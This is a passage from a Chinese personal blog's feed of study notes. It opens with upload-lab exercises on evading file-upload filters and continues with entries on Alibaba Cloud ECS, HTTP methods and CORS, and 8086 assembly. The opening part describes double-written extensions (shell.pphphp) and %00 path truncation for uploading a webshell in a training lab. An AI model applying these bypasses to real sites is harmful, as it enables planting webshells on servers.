后缀双写绕过</h2><blockquote><p>查看源码，发现他一旦遇到黑名单里的后缀名，就会将其后缀名替换为空，也就是没有后缀名了，因此双写后缀名，即使去除一个，还有一个后缀名</p></blockquote><ul><li>上传文件，burpsuite抓包，然后将文件后缀名最后加上点空格点，然后上传</li><li>修改文件名为shell.pphphp<ul><li>不能是连续的php，不然都要被去掉</li></ul></li></ul><h2 id="Pass-12-00截断"><a href="#Pass-12-00截断" class="headerlink" title="Pass-12 %00截断"></a>Pass-12 %00截断</h2><h3 id="空字符"><a href="#空字符" class="headerlink" title="空字符"></a>空字符</h3><blockquote><p>（你好 0x00php）php发现了0x00之后就不会读取之后的数据了</p></blockquote><ul><li>0x00：编程语言</li><li>%00：URL编码（ASCII码转化为十六进制，再加上%）</li></ul><blockquote><p>查看源码，这道题是白名单</p></blockquote><ul><li><p>上传jpg文件，burpsuite抓包，然后在文件的保存路径上直接写一个文件，然后%00截断后面的内容，然后上传</p><ul><li><p>jpg是用来通过白名单的</p><p>  <img src="https://pic.imgdb.cn/item/668935e1d9c307b7e95220bc.png"></p></li></ul></li></ul><h2 id="Pass-13-0x00截断"><a href="#Pass-13-0x00截断" class="headerlink" title="Pass-13 0x00截断"></a>Pass-13 0x00截断</h2>]]></content>
      
      
      <categories>
          
          <category> upload注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> upload注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里云云服务器</title>
      <link href="/2024/06/17/a-li-yun-yun-fu-wu-qi/"/>
      <url>/2024/06/17/a-li-yun-yun-fu-wu-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="阿里云-云服务器"><a href="#阿里云-云服务器" class="headerlink" title="阿里云-云服务器"></a>阿里云-云服务器</h1><blockquote><p>云服务器 ECS（Elastic Compute Service）是一种安全可靠、弹性可伸缩的云计算服务，助您降低 IT 成本，提升运维效率，使您更专注于核心业务创新。 专业的售前技术支持，协助您选择最合适配置方案</p></blockquote><h2 id="弹性伸缩"><a href="#弹性伸缩" class="headerlink" title="弹性伸缩"></a>弹性伸缩</h2><p>弹性伸缩（Elastic Scaling service）是根据用户的业务需求和策略，经济地自动调整弹性计算资源的管理服务。弹性伸缩不仅适合业务量不断波动的应用程序，同时也适合业务量稳定的应用程序。免费使用，所需资源按照相关价格计费。</p><p><img src="https://pic.imgdb.cn/item/666fd110d9c307b7e9e5eabd.png"></p><ul><li>弹性：支持<strong>纵向</strong>和<strong>横向</strong>的扩展</li></ul><ol><li>纵向：即单个服务器的配置变更，传统的IDC模式，很难做到对单个服务器进行变更配置。简单来说，就是可以根据业务量增加和减少自由变更自己的配置</li><li>横向：对于游戏应用或直播平台出现的高峰期，若在传统的IDC模式下，根本无法立即准备资源，而云计算却可以使用弹性的方式帮助客户度过这样的高峰。当业务高峰消失时，您可以将多余的资源释放掉，以减少业务成本的开支。</li></ol><h2 id="ECS的优势"><a href="#ECS的优势" class="headerlink" title="ECS的优势"></a>ECS的优势</h2><p><img src="https://pic.imgdb.cn/item/66d478d3d9c307b7e9be0b4c.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>小白图解网络学习笔记</title>
      <link href="/2024/06/07/xiao-bai-tu-jie-wang-luo-xue-xi-bi-ji/"/>
      <url>/2024/06/07/xiao-bai-tu-jie-wang-luo-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="小白图解网络学习笔记"><a href="#小白图解网络学习笔记" class="headerlink" title="小白图解网络学习笔记"></a>小白图解网络学习笔记</h1><p>模型：</p><p><img src="https://pic.imgdb.cn/item/666309395e6d1bfa055281bb.png"></p><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><h3 id="HTTP报文格式"><a href="#HTTP报文格式" class="headerlink" title="HTTP报文格式"></a>HTTP报文格式</h3><ol><li>请求报文</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /cmaskboss/164203142_30_1.enhance.webmask HTTP/1.1</span><br><span class="line">请求方法 URL 协议版本</span><br><span class="line">//Headers头</span><br><span class="line">Host: upos-sz-staticks3.bilivideo.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) </span><br><span class="line">AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: https://www.bilibili.com</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://www.bilibili.com/</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Range: bytes=0-16</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>响应报文</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 206 Partial Content</span><br><span class="line">协议版本  状态码    状态描述符</span><br><span class="line">//Headers信息</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">Content-Length: 17</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Server: Tengine</span><br><span class="line">ETag: "92086de1e6d1d4791fb950a0ac7e30ba"</span><br><span class="line">Date: Sat, 30 Jan 2021 09:31:31 GMT</span><br><span class="line">Last-Modified: Sun, 04 Oct 2020 01:54:28 GMT</span><br><span class="line">Expires: Mon, 01 Mar 2021 09:31:31 GMT</span><br><span class="line">Age: 1018695</span><br><span class="line">Content-Range: bytes 0-16/353225</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">X-Application-Context: application</span><br><span class="line">x-kss-request-id: 75bcbfa8ab194e3c825e89c81a912692</span><br><span class="line">x-kss-BucketOwner: MjAwMDAyMDEwNw==</span><br><span class="line">X-Info-StorageClass: -</span><br><span class="line">Content-MD5: kght4ebR1HkfuVCgrH4wug==</span><br><span class="line">X-Cache-Status: HIT from KS-CLOUD-JH-MP-01-03</span><br><span class="line">X-Cache-Status: HIT from KS-CLOUD-TJ-UN-14-13</span><br><span class="line">X-Cache-Status: HIT from KS-CLOUD-LF-UN-11-25</span><br><span class="line">Access-Control-Allow-Origin: https://www.bilibili.com</span><br><span class="line">Access-Control-Allow-Headers: Origin,X-Requested-With,ContentType,Accept,range</span><br><span class="line">X-Cdn-Request-ID:</span><br><span class="line">7e2c783ca7d392624118593ec1dc66bc</span><br></pre></td></tr></tbody></table></figure><h3 id="Request-URL"><a href="#Request-URL" class="headerlink" title="Request URL"></a>Request URL</h3><p>url：协议://URL：（端口号）/虚拟目录/……（虚拟目录）/文件名？</p><h4 id="URL与URI的区别"><a href="#URL与URI的区别" class="headerlink" title="URL与URI的区别"></a>URL与URI的区别</h4><ul><li><p>URL:Uniform Resource Locator 统⼀资源定位符； </p></li><li><p>URI: Uniform Resource Identifier 统⼀资源标识符；</p></li></ul><p>​URL是URI的子集</p><p>​简单解释下。 假设”小白”(URI)是⼀种资源，”在迪丽亦巴的怀里”表明了一个位置。如果你想要找到（locate）小白， 那么你可以到”在迪丽亦巴怀里”找到小白，而”在迪丽亦巴怀里的/小白”才是我们常说的URL。而”在迪丽亦巴怀里的/小白”（URL）显然是”小白”（URI）的子集，毕竟，”小白”还可能是”在牛亦菲怀⾥的/小白”（其他URL）</p><h3 id="Request-Method"><a href="#Request-Method" class="headerlink" title="Request Method"></a>Request Method</h3><p>请求方法：Get、POST、HEAD、OPTIONS、PUT、DELETE、TRACE 、CONNECT</p><h4 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h4><p>请求指定的页面信息，并返回消息主体(body)+头信息(header)。</p><h4 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h4><p>HEAD和GET本质是⼀样的，区别在于HEAD只返回头信息(header)，不返回消息主体(body)</p><ul><li><p>HEAD省下拿body的消耗</p></li><li><p>如果请求的是⼀个⽐较⼤的资源，使用HEAD请求，返回的headers会带有文件的大小，不需要整个下载下来</p></li></ul><h4 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h4><p>POST每次调用都可能会修改数据，是非幂等的，而GET类似于只读，是<u>幂等</u>的。在HTTP规范中POST是<u>非等幂</u>的，多次调用会产生不同的结果</p><ul><li><p>幂等（Idempotent）：指一个操作的重复执行不会产生额外的影响。无论对一个操作进行一次或多次的执行，系统状态都会保持一致。换句话说，多次执行幂等操作所产生的结果与执行一次的结果相同。常见的幂等操作包括GET请求、删除某个资源等。</p></li><li><p>非幂等（Non-Idempotent）：指一个操作的重复执行会导致系统状态发生变化。多次执行非幂等操作可能会对系统产生不同的影响，导致状态发生改变。比如POST请求、创建资源等操作通常是非幂等的。</p></li></ul><h4 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h4><p>创建⼀个用户,由于网络原因或是其他原因多创建了几次,那么将会有多个用户被创建。而PUT id/xiaobai 则会创建一个id为 xiaobai 的用户，多次调用还是会创建的结果是⼀样的，所以PUT是等幂的</p><h4 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h4><p>⼀般实战中如果是删除操作，也是使用POST来替代</p><h4 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><p>用于获取当前URL所支持的方法，若请求成功，则它会在HTTP响应头部中带上给各种“Allow”的头，表明某个请求在对应的服务器中都支持哪种请求方法</p><p><img src="https://pic.imgdb.cn/item/66631c7e5e6d1bfa056c0e04.png"></p><ul><li><p>Response Header里的关键字段</p><p>  <img src="https://pic.imgdb.cn/item/66631cf65e6d1bfa056cba38.png"></p></li></ul><p><strong>跨域</strong>的情况下，浏览器发起<u>复杂请求</u>前会<u>自动发起 options 请求</u></p><h5 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h5><ul><li>请求方法为 GET、HEAD、POST </li><li>只有以下 Headers 字段 <ul><li>Accept </li><li>Accept-Language</li><li>Content-Language </li><li>Content-Type </li><li>DPR/Downlink/Save-Data/Viewport-Width/Width (这些不常见，放在⼀起)</li></ul></li><li>Content-Type 只有以下三种 <ul><li>application/x-www-form-urlencoded </li><li>multipart/form-data </li><li>text/plain</li></ul></li><li>请求中的任意 XMLHttpRequestUpload 对象均没有注册任何事件监听器； </li><li>请求中没有使用 ReadableStream 对象。</li></ul><h5 id="复杂请求"><a href="#复杂请求" class="headerlink" title="复杂请求"></a>复杂请求</h5><ul><li><p>不满足简单请求的，都是复杂请求</p></li><li><p>因为上述请求在获取网上资源的请求Headers里带有 Access-Control-Request-Headers:  range , 而 range 正好不在简单请求的条件2中提到的Headers范围里，因此属于复杂请求，于是触发预检options请求</p></li></ul><p><strong>跨域</strong></p><ul><li>同源：域名、协议、端⼝均相同</li></ul><p>例子：</p><p><img src="https://pic.imgdb.cn/item/66821f6bd9c307b7e92be8e7.png"></p><p><strong>注意</strong>：localhost和127.0.0.1虽然都指向本机，但也不属于同源</p><ul><li><strong><u>非同源</u><strong>之间网页调用就是我们所说的</strong><u>跨域</u></strong></li><li>每次复杂请求前都要使用options询问一次</li></ul><h5 id="如何优化options"><a href="#如何优化options" class="headerlink" title="如何优化options"></a>如何优化options</h5><p>​每次复杂请求前都会调用⼀次options，这其实没有必要。因为大部分时候相同的请求，短时间内获得的结果是不会变的，是否可以通过浏览器缓存省掉这⼀次查询？</p><p>​Access-Control-Max-Age 就是优化这个流程中使用的⼀个Header。它的作用是当你每次请求 options 方法时，服务端返回调用支持的方法（Access-Control-Allow-Methods ）和 Headers（Access-Control-Allow-Headers）有哪些，同时告诉你，它在接下来 Access-ControlMax-Age 时间（单位是秒）里都支持，则这段时间内，不再需要使用options进行请求。</p><p>​特别注意的是， 当 Access-Control-Max-Age 的值为-1时，表示禁用缓存，每⼀次请求都需要发送预检请求，即用 OPTIONS请求进行检测。</p><h5 id="Status-Code（状态码）"><a href="#Status-Code（状态码）" class="headerlink" title="Status Code（状态码）"></a>Status Code（状态码）</h5><p>浏览器向服务器发送请求，服务器则会根据请求作出响应，而状态码则是响应的⼀部分，代表着本次请求的结果。</p><img src="https://pic.imgdb.cn/item/66822309d9c307b7e930bd3a.png" style="zoom: 67%;">]]></content>
      
      
      <categories>
          
          <category> 网络技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全攻防-渗透测试实战指南</title>
      <link href="/2024/06/07/web-an-quan-gong-fang-shen-tou-ce-shi-shi-zhan-zhi-nan/"/>
      <url>/2024/06/07/web-an-quan-gong-fang-shen-tou-ce-shi-shi-zhan-zhi-nan/</url>
      
        <content type="html"><![CDATA[<p>学习资源：<a href="https://www.bilibili.com/video/BV1uT4y1i73u">【MS08067实验室】《Web安全攻防:渗透测试实战指南》全套视频，学安全这一套就够了（零基础入门到就业）_哔哩哔哩_bilibili</a></p><h1 id="Web安全攻防-渗透测试实战指南"><a href="#Web安全攻防-渗透测试实战指南" class="headerlink" title="Web安全攻防-渗透测试实战指南"></a>Web安全攻防-渗透测试实战指南</h1><h2 id="Web基础知识"><a href="#Web基础知识" class="headerlink" title="Web基础知识"></a>Web基础知识</h2><h3 id="Web常见术语"><a href="#Web常见术语" class="headerlink" title="Web常见术语"></a>Web常见术语</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言</title>
      <link href="/2024/06/06/hui-bian-yu-yan/"/>
      <url>/2024/06/06/hui-bian-yu-yan/</url>
      
        <content type="html"><![CDATA[<h1 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h1><h2 id="学习路径-："><a href="#学习路径-：" class="headerlink" title="==学习路径==："></a>==学习路径==：</h2><p>[汇编语言](<a href="https://www.bilibili.com/video/BV1Rs411c7HG%EF%BC%89">https://www.bilibili.com/video/BV1Rs411c7HG）</a></p><h2 id="测试点练习路径-："><a href="#测试点练习路径-：" class="headerlink" title="==测试点练习路径==："></a>==测试点练习路径==：</h2><p><a href="https://hansimov.gitbook.io/asm-lang/solutions/ch01-basics">汇编语言 - 王爽</a></p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><blockquote><p>汇编语言是机器指令便于记忆的的书写格式</p></blockquote><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><ol><li>汇编指令（机器码的助记符）</li><li>伪指令（由编译器执行）</li><li>其他符号（由编译器识别）：+-*÷ 由编译器转换为逻辑运算符（与或非）传给计算机执行</li></ol><h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3><blockquote><p>存储单元的地址（地址信息）<br>器件的选择，读或写命令（控制信息）<br>读或写的数据（数据信息）</p></blockquote><p>==总线==：连接CPU与其他芯片的导线</p><ol><li><p>地址总线</p><ul><li>通过地址总线来指定存储单元</li><li>一个cpu有N根地址总线，则可以说这个cpu地址总线的宽度位N，最多可以寻找2^n^个存储单元</li><li>64位的速度由64位CPU、64位操作系统、64位软件共同决定</li></ul></li><li><p>数据总线</p><ul><li>数据总线的宽度决定cpu与外界的数据传送速度</li></ul></li><li><p>控制总线</p><ul><li>有多少根控制总线，就意味着cpu提供了对外部器件的多少种控制</li></ul></li></ol><p>==内存地址空间==：</p><p>​假如一个cpu的地址总线宽度为10，那么可以寻址1024个内存单元，这些内存单元就构成了这个cpu的内存地址空间</p><p>==主板==：</p><p>​一个PC有一个主板，包含核心器件和主要器件，这些器件通过总线相连</p><p>==接口卡==：</p><p>​cpu对外部设备不能直接控制，直接控制这些设备进行互作的是插在扩展插槽的接口卡</p><p>==存储器芯片==：</p><ol><li><p>从读写属性上看分为：随机存储器（RAM）和只读存储器（ROM）</p></li><li><p>从功能和连接上分类：</p><ul><li><p>随机存储器RAM</p></li><li><p>装有BIOS的ROM</p><ol><li>BIOS(基本输入输出系统)：由主板和各类接口卡厂商提供的软件系统，可以通过它利用该硬件设备进行最基础的输入输出。cpu与显示器通过显卡；网卡。</li></ol></li><li><p>接口卡上的RAM</p></li></ul></li></ol><p>主板逻辑连接：</p><img src="https://pic.imgdb.cn/item/6662f2ef5e6d1bfa053655fe.png" style="zoom: 67%;"><h2 id="寄存器（CPU工作原理）"><a href="#寄存器（CPU工作原理）" class="headerlink" title="寄存器（CPU工作原理）"></a>寄存器（CPU工作原理）</h2><h3 id="CPU概述"><a href="#CPU概述" class="headerlink" title="CPU概述"></a>CPU概述</h3><blockquote><p>由运算器、控制器、寄存器等器件组成</p></blockquote><h3 id="寄存器概述"><a href="#寄存器概述" class="headerlink" title="寄存器概述"></a>寄存器概述</h3><blockquote><p>8086CPU有14个寄存器</p></blockquote><p>==通用寄存器==：</p><ol><li><p>通用寄存器：AX，BX，CX，DX：存放一般数据</p></li><li><p>8086CPU所有的寄存器都是16位，可以存放两个字节</p></li></ol><p><img src="https://pic.imgdb.cn/item/66651a0f5e6d1bfa05504fc1.png"></p><img src="https://pic.imgdb.cn/item/66651a915e6d1bfa05511a7b.png" style="zoom: 80%;"><ol start="3"><li><p>为保证兼容性，会将这四个16位的寄存器都分别分为两个独立的8位的寄存器（可独立使用），以兼容以前的8位寄存器</p></li><li><p>AX可以分为AH（高位）和AL（低位），BX、CX、DX同理</p></li></ol><p><img src="https://pic.imgdb.cn/item/66651c475e6d1bfa05541995.png"></p><p>==字==：</p><p>一个字=2字节（2B），字高位和低位分别对应寄存器的高位和低位</p><h3 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h3><blockquote><p>汇编指令不区分大小写</p></blockquote><p><img src="https://pic.imgdb.cn/item/666526ed5e6d1bfa055e1914.png"></p><p><img src="https://pic.imgdb.cn/item/666550545e6d1bfa058c71bd.png"></p><p>00C5H+93H=0058H（不是0158H，因为高低8位是独立的，不共用，进制位会被单独存放在特点的寄存器）</p><h3 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h3><p>==16位结构的CPU==：</p><ol><li>运算器一次最多可以处理16位的数据</li><li>寄存器的最大宽度位16位</li><li>寄存器和运算器之间的通路是16位</li></ol><p>8086cpu给出物理地址的方法</p><img src="https://pic.imgdb.cn/item/6665596a5e6d1bfa05977392.png" style="zoom:80%;"><p>地址加法器工作原理：</p><p>​合成物理地址的方法：</p><p>​<u>物理地址=段地址*16+偏移地址</u></p><p><img src="https://pic.imgdb.cn/item/66655a625e6d1bfa05987fd4.png"></p><h3 id="段的概念"><a href="#段的概念" class="headerlink" title="段的概念"></a>段的概念</h3><blockquote><p>内存并没有分段，段的划分来自于CPU</p><p>CPU访问内单元时，必须向内存提供内存单元的物理地址</p><p>8086CPU在内部用段地址和偏移地址移位相加的方法形成最终的物理地址</p></blockquote><ul><li>CPU可以用不同的段地址+偏移地址形成同一个物理地址</li></ul><p><img src="https://pic.imgdb.cn/item/66729796d9c307b7e9683f92.png"></p><h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><blockquote><p>8086CPU有四个段寄存器：</p><ul><li>CS（代码段寄存器，Code Segment）</li><li>DS（数据段寄存器，Data Segment）</li><li>SS（堆栈段寄存器，Stack Segment）</li><li>ES（附加段寄存器，Extra Segment）</li></ul><p>当8086CPU需要访问内存时，由这4个寄存器提供内存单元的段地址</p></blockquote><p>==CS和IP（指令指针寄存器）==</p><p><img src="https://pic.imgdb.cn/item/6672a236d9c307b7e97b9464.png"></p><p>工作流程：</p><ol><li>从CS:IP指向的内存单元读取指令，读取的指令进入指令缓冲区</li><li>IP=IP+所读取指令的长度，从而指向下一条指令</li><li>执行指令，转到步骤1</li></ol><blockquote><p>在8086CPU加电启动时，CS=FFFFH，IP=0000H，即CPU从内存FFFF0H单元中读取指令执行</p></blockquote><p>==修改CS:IP的指令==</p><ul><li><p>mov不能用于设置CS、IP的值</p></li><li><p>同时修改CS、IP:</p></li></ul><p>​而是用转移指令：jmp</p><p>​<u>jmp 段地址:偏移地址</u></p><p>​jmp 2AE3:3 对应物理地址2AE33</p><p>​jmp 3:0B16 对应物理地址0003*16=00030，00030+00B16=00B46</p><ul><li>仅修改IP的内容</li></ul><p>​jmp 某一合法寄存器</p><p>​jmp ax（类似于mov IP,ax）//用寄存器的值修改IP</p><p>练习：</p><img src="https://pic.imgdb.cn/item/6672add2d9c307b7e990a2f6.png" style="zoom:67%;"><p>依次执行：</p><ul><li><p>mov ax,6622H ax=6622</p></li><li><p>jmp 1000:3 </p></li><li><p>mov ax,0000ax=0000</p></li><li><p>mov bx,axbx=0000</p></li><li><p>jmp bx</p></li><li><p>mov ax,0123H         ax=0123</p></li><li><p>执行mov ax,0000 不断循环</p></li></ul><h3 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h3><blockquote><p>对于8086PC机，可以根据需求将一组内存单元定义为一个段</p><p>可以将长度为N的一组代码存在一组地址连续、起始地址为16的倍数的内存单元中，这段内存是用来存放代码的，从而定义了一个代码段</p></blockquote><img src="https://pic.imgdb.cn/item/6672b19bd9c307b7e997288c.png" style="zoom:67%;"><p>CS:IP指向代码段，则代码段就被执行，CPU只认CS:IP所指代码段</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><blockquote><p>查看CPU和内存，用机器指令和汇编指令编程</p><p>使用工具：DOSBox</p></blockquote><img src="https://pic.imgdb.cn/item/6672b712d9c307b7e9a01d33.png" style="zoom:67%;"><p>​R:查看、改变CPU寄存器内容</p><p><img src="https://pic.imgdb.cn/item/6673bd69d9c307b7e9544e8c.png"></p><p>T:执行指令</p><p><img src="https://pic.imgdb.cn/item/6673bdfbd9c307b7e9554102.png"></p><p>D:查看内存内容</p><p><img src="https://pic.imgdb.cn/item/6673be4cd9c307b7e955bf8a.png"></p><p>（1）</p><p><img src="https://pic.imgdb.cn/item/6673bf23d9c307b7e9572b6e.png"></p><ol><li>通过-a，将指令输入</li><li>用过-d，来查看内存</li></ol><p><img src="https://pic.imgdb.cn/item/6673c0f3d9c307b7e95a4cb0.png"></p><ol start="3"><li>用u来将指令转换为汇编语言</li></ol><p><img src="https://pic.imgdb.cn/item/6673c15dd9c307b7e95b0087.png"></p><ol start="4"><li>改变CS:IP指向刚刚执行的指令</li></ol><p><img src="https://pic.imgdb.cn/item/6673c3e9d9c307b7e95f838a.png"></p><ol start="5"><li>执行当前指令，发现ax被覆盖，并且IP的值也指向了下一个指令</li></ol><p><img src="https://pic.imgdb.cn/item/6673c431d9c307b7e95ff75c.png"></p><p>（2）将下面3条指令写入从2000:0开始的内存单元中，利用这3条指令计算2的8次方</p><ul><li>mov ax,1</li><li>add ax,ax</li><li>jmp 2000:0003</li></ul><ol><li>-a写入指令</li><li>-r改变CS:IP指向指令内存地址</li><li>-t依次执行</li></ol><p><img src="https://pic.imgdb.cn/item/6673c77ed9c307b7e966d310.png"></p><p>（3）</p><p><img src="https://pic.imgdb.cn/item/6673c89fd9c307b7e968c609.png"></p><ol><li>-d查看，其中30（十六进制）对应0（ASCII），2F（十六进制）对应/（ASCII），依次对应</li></ol><p><img src="https://pic.imgdb.cn/item/6673c9e4d9c307b7e96b591e.png"></p><ol start="2"><li>-e更改，发现无法更改，因为写在ROM中的，为只读</li></ol><p><img src="https://pic.imgdb.cn/item/6673cc10d9c307b7e972caea.png"></p><p>（4）</p><p><img src="https://pic.imgdb.cn/item/6673cc4dd9c307b7e973d476.png"></p><p><img src="https://pic.imgdb.cn/item/6673cce2d9c307b7e9760560.png"></p><p>观察右上角出现图案，是因为在往显存中写数据，所以出现了图案</p><h2 id="寄存器（内存访问）"><a href="#寄存器（内存访问）" class="headerlink" title="寄存器（内存访问）"></a>寄存器（内存访问）</h2><h3 id="内存中字的存储"><a href="#内存中字的存储" class="headerlink" title="内存中字的存储"></a>内存中字的存储</h3><ul><li>任何两个地址连续的内存单元，N号单元和N+1号单元可以看成两个内存单元，也可以看成一个地址为N的<strong>字单元</strong>中的<strong>高位</strong>字节单元和<strong>低位</strong>字节单元</li></ul><img src="https://pic.imgdb.cn/item/66765f31d9c307b7e9198672.png" style="zoom: 67%;"><p>1地址<strong>字单元</strong>的中存放的<strong>字型</strong>数据是<u>124EH</u></p><p>2地址<strong>字单元</strong>的中存放的<strong>字型</strong>数据是<u>0012H</u></p><h3 id="DS和-address"><a href="#DS和-address" class="headerlink" title="DS和[address]"></a>DS和[address]</h3><p>mov指令格式：</p><ul><li>[ ]：表示一个内存单元</li><li>[ ]中的0：表示内存单元中的偏移地址</li></ul><p><img src="https://pic.imgdb.cn/item/66792c60d9c307b7e9c98c40.png"></p><p><strong>注意</strong>：8086CPU不支持将数据直接送入段寄存器（DS）（硬件设计的问题）<br>所以mov ds,1000H是不合法的</p><p><strong>数据–&gt;通用寄存器–&gt;段寄存器</strong> </p><p>如何将数据从寄存器送入内存单元？也就是从内存单元读数据的逆过程，但是注意通过通用寄存器作为中间人</p><p><img src="https://pic.imgdb.cn/item/6679306bd9c307b7e9d22b21.png"></p><h3 id="字的传送"><a href="#字的传送" class="headerlink" title="字的传送"></a>字的传送</h3><blockquote><p>8086CPU是16位结构，有16根数据线，可以一次性传送16位数据（一个字）</p></blockquote><p><img src="https://pic.imgdb.cn/item/66794388d9c307b7e9fa7948.png"></p><ol><li>先写入数据</li></ol><p><img src="https://pic.imgdb.cn/item/66794b09d9c307b7e90b27cd.png"></p><ol start="2"><li>查看寄存器信息，以及CS:IP所指内存地址的信息</li></ol><p><img src="https://pic.imgdb.cn/item/66794c0cd9c307b7e90d7b88.png"></p><ol start="3"><li>写入指令</li></ol><p><img src="https://pic.imgdb.cn/item/6679453fd9c307b7e9ff3aa5.png"></p><ol start="4"><li>执行指令，mov ax,[0]:将DS为1000，偏移量[0]，也就是地址为10000H的值，以及高一个的地址的值传入ax，此处也就是10000H以及10001H的值，因此ax=1123，以此类推</li></ol><p><img src="https://pic.imgdb.cn/item/66794831d9c307b7e904e9dc.png"></p><p>add bx,[1]:将bx的值（6622）加上DS为1000，偏移地址为[1]（也就是10001H的值）及高一个的地址（10002H的值），因此bx=6622H+2211H=8833H，以此类推</p><p><img src="https://pic.imgdb.cn/item/66794964d9c307b7e907d00c.png"></p><p><strong>注意</strong>：如何来看是吧[0]、[1]……当作字节（1字节）来看，还是当作字（2字节）来看</p><ul><li><p>如果为ax则当作字来看，则取当前及上一个的地址</p></li><li><p>如果为al或者ah，则当成字节来看，取当前的地址</p></li></ul><p><img src="https://pic.imgdb.cn/item/6679629dd9c307b7e9450f23.png"></p><ol><li><p>写入数据</p></li><li><p>写入指令（11316为十进制，对应十六进制为2C34；sub指令就是相减）</p></li><li><p>执行指令</p></li></ol><p><img src="https://pic.imgdb.cn/item/667964f1d9c307b7e94b95c7.png"></p><p>sub bx,[2] 就为bx=bx-[2]，所以bx=2c34-1122=1b12，查看内存信息，1b12已经存入内存</p><p><img src="https://pic.imgdb.cn/item/66796671d9c307b7e94fd244.png"></p><h3 id="mov、add、sub指令"><a href="#mov、add、sub指令" class="headerlink" title="mov、add、sub指令"></a>mov、add、sub指令</h3><p>mov:</p><p><img src="https://pic.imgdb.cn/item/66796899d9c307b7e95512ac.png"></p><p>add、sub:</p><img src="https://pic.imgdb.cn/item/66796f40d9c307b7e968dfa4.png" style="zoom: 80%;"><h3 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h3><blockquote><p>8位为一个字节，16位（2字节）为一个字，32位（4字节）为双字</p></blockquote><p><img src="https://pic.imgdb.cn/item/667cf196d9c307b7e90651fb.png"></p><p><img src="https://pic.imgdb.cn/item/667cff8cd9c307b7e91f5ad7.png"></p><blockquote><p>逻辑地址等于段地址左移4位后加上偏移地址，即逻辑地址 = 段地址 x 16 + 偏移地址</p></blockquote><p><img src="https://pic.imgdb.cn/item/667d0945d9c307b7e932282d.png"></p><ul><li>0001:0000 = 0001 *16 +0000 = 0010</li></ul><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><blockquote><p>push指令：入栈</p><p>pop指令：出栈</p><p>8086CPU的入栈和出栈都是以字为单位进行</p></blockquote><ul><li>push ax：将寄存器ax中的数据送入栈中</li><li>pop ax：从栈顶取出数据送入ax</li></ul><p>入栈：</p><img src="https://pic.imgdb.cn/item/667d127ad9c307b7e944166d.png" style="zoom:67%;"><p>出栈：</p><img src="https://pic.imgdb.cn/item/667d12fad9c307b7e94501c2.png" style="zoom: 67%;"><blockquote><p>段寄存器SS：存放栈顶的段地址</p><p>寄存器SP：存放栈顶的偏移地址</p><p>SS:SP指向栈顶元素</p></blockquote><p>push指令执行过程：</p><img 